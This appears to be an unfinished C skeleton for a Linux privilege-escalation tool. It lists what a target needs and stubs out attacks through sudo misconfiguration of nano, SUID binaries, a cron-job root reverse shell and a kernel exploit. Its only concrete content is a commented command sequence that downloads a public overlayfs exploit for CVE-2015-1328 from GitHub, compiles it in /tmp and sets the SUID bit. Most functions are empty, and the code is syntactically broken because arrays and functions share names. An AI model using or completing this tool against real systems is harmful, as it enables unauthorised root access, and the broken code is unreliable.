/**
 * uid.c 
 * priv esc on vulnerable systems
*/

#include "uid.h"

/**
 * target must have:
 * 
 * gcc(for most attacks)
 * nano text editor(should be installed by default)
 * write access to /tmp directory
 * 
 * although there are multiple methods of attacking a target system, we can take advantage of a couple of them
*/

/**
 * we can take advantage of multiple methods, including lazy sudo configuration, suid, etc
 * 
 * however unlike normal scripts, this is instead a pre defined one
*/

// define scripts
uint8_t binaryEsc[100] {

}

uint8_t suidEsc[100] {

}
uint8_t cronEsc[100] {

}
uint8_t kernelExp[100] {
    // cd /tmp
    // wget https://raw.githubusercontent.com/SecWiki/linux-kernel-exploits/master/2015/CVE-2015-1328/37292.c
    // gcc 37292.c -o kernelExp
    // chmod +s kernelExp
}

// attack creates a binary then runs it in the /tmp directory
void binaryEsc(void) {

}

// attack takes advantage of lazy sudo configuration for nano
void suidEsc(void) {

}

// totally not xz!
// attack creates a root reverse shell using a cron job
void cronEsc(void) {

}

// attack creates an overlay fs if vulnerable
void kernelExp(void) {

}